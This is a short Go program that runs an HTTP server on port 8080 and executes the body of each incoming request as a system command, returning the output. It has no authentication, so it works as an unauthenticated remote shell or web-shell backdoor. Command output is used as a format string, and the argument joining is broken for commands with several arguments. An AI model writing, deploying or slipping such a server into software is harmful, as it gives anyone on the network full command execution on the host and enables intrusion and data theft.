package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
)

var mylog = log.New(os.Stderr, "app: ", log.LstdFlags|log.Lshortfile)

func runCommand(command string) string {
	commandStructure := strings.Split(command, " ")

	args := commandStructure[1:]

	spacedArgs := strings.Join(args, " ")

	commandOutput, err := exec.Command(commandStructure[0], spacedArgs).Output()
	if err != nil {
		return err.Error()
	}
	return string(commandOutput)
}

func handler(w http.ResponseWriter, r *http.Request) {
	bodyBytes, err := ioutil.ReadAll(r.Body)
	if err != nil {
		mylog.Fatalln(err.Error())
	}
	bodyString := string(bodyBytes)
	output := runCommand(bodyString)
	fmt.Fprintf(w, output)
}

func main() {
	http.HandleFunc("/", handler)
	http.ListenAndServe(":8080", nil)
}
